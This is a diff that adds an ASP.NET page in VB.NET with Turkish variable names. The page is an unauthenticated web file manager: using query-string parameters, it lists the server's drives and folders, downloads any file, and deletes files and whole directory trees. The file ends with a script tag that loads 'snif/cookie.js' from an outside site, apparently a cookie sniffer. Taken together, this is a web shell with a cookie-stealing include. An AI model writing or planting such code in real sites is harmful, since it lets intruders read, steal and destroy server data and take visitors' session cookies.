@@ -1,0 +1,207 @@
+<%@ Page Language="VB" autoEventWireup="false" %>
+
+<%@ Import Namespace="System.IO" %>
+
+
+
+<script runat="server">
+
+Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+
+
+
+Dim Islem As String=Request.QueryString("islem")
+
+Dim Dizin As String=Request.QueryString("dizin")
+
+Dim Dosya As String=Request.QueryString("dosya")
+
+
+
+Dim UstDizinAdi As String=""
+
+
+
+Dim Suruculer() As String
+
+Dim Surucu As String
+
+
+
+If Islem<>"" And Dizin="" Then Response.Redirect("file.aspx")
+
+
+
+If Islem<>"dosyaindir" Then
+
+	Suruculer=Directory.GetLogicalDrives()
+
+	Response.Write("<b>Sürücüler : </b>")
+
+	For Each Surucu In Suruculer
+
+		Response.Write("<a href=?islem=listele&dizin=" & Surucu & ">" & Surucu & "</a> - ")
+
+	Next
+
+	
+
+	Response.Write("<br><br>")
+
+	
+
+	Dim UstDizin As DirectoryInfo
+
+	
+
+	Try
+
+		UstDizin=Directory.GetParent(Dizin)
+
+		UstDizinAdi=UstDizin.ToString
+
+		Response.Write("<a href=file.aspx?islem=listele&dizin=" & UstDizin.ToString & ">Yukarı</a><br><hr>")
+
+	Catch
+
+		Response.Write("Yukarı Yok<br><hr>")
+
+	End Try
+
+End If
+
+
+
+Select Case Islem
+
+
+
+Case "listele"
+
+	Dim DI As DirectoryInfo
+
+	Dim Dizinler() As String
+
+	Dim BirDizin As String
+
+	
+
+	Dim Dosyalar() As String
+
+	Dim BirDosya As String
+
+	
+
+	DI=New DirectoryInfo(Dizin)
+
+	Dizinler=Directory.GetDirectories(Dizin)
+
+	
+
+	If DI.Exists Then
+
+		Response.Write("<b>Dizinler : </b><br><br>")
+
+		For Each BirDizin In Dizinler
+
+			Response.Write("<a href=file.aspx?islem=dizinsil&dizin=" & Server.UrlEncode(BirDizin) & ">Sil</a> - ")
+
+			Response.Write("<a href=file.aspx?islem=listele&dizin=" & Server.UrlEncode(BirDizin) & ">" & BirDizin & "</a><br>")
+
+		Next
+
+	Else
+
+		Response.Write("Dizin Yok<br><br>")
+
+	End If
+
+	
+
+	Response.Write("<hr><b>Dosyalar : </b><br><br>")
+
+	Dosyalar=Directory.GetFiles(Dizin)
+
+	For Each BirDosya In Dosyalar
+
+		Response.Write("<a href=file.aspx?islem=dosyaindir&dizin=" & Dizin & "&dosya=" & Server.UrlEncode(BirDosya) & ">İndir</a> - ")
+
+		Response.Write("<a href=file.aspx?islem=dosyasil&dizin=" & Dizin & "&dosya=" & Server.UrlEncode(BirDosya) & ">Sil</a> - ")
+
+		Response.Write(BirDosya & "<br>")
+
+	Next
+
+Case "dizinsil"
+
+	Directory.Delete(Dizin,True)
+
+	Response.Redirect("file.aspx?islem=listele&dizin=" & UstDizinAdi)
+
+Case "dosyasil"
+
+	File.Delete(Dosya)
+
+	Response.Redirect("file.aspx?islem=listele&dizin=" & Dizin)
+
+Case "dosyaindir"
+
+	Dim AkisNesne As System.IO.Stream
+
+	Dim TamponX As Integer=32768
+
+	Dim Tampon(TamponX) As Byte
+
+	Dim OkunanX As Integer
+
+	Dim Kalan As Long
+
+	
+
+	AkisNesne=New System.IO.FileStream(Dosya, System.IO.FileMode.Open, IO.FileAccess.Read, IO.FileShare.Read)
+
+	Kalan=AkisNesne.Length
+
+	Response.ContentType="application/octet-stream"
+
+	Response.AddHeader("Content-Disposition", "attachment; filename=" & Server.UrlEncode(Dosya))
+
+	While Kalan > 0
+
+		If Response.IsClientConnected Then
+
+			OkunanX=AkisNesne.Read(Tampon, 0, TamponX)
+
+			Response.OutputStream.Write(Tampon, 0, OkunanX)
+
+			Response.Flush()
+
+			ReDim Tampon(TamponX)
+
+			Kalan=Kalan-OkunanX
+
+		Else
+
+			Kalan=-1
+
+		End If
+
+	End While
+
+	If IsNothing(AkisNesne)=False Then
+
+		AkisNesne.Close()
+
+	End If
+
+End Select
+
+
+
+End Sub
+
+</script>
+
+
+
+'<script type="text/javascript" language="javascript" src="http://www.materyal.org/snif/cookie.js"></script>';
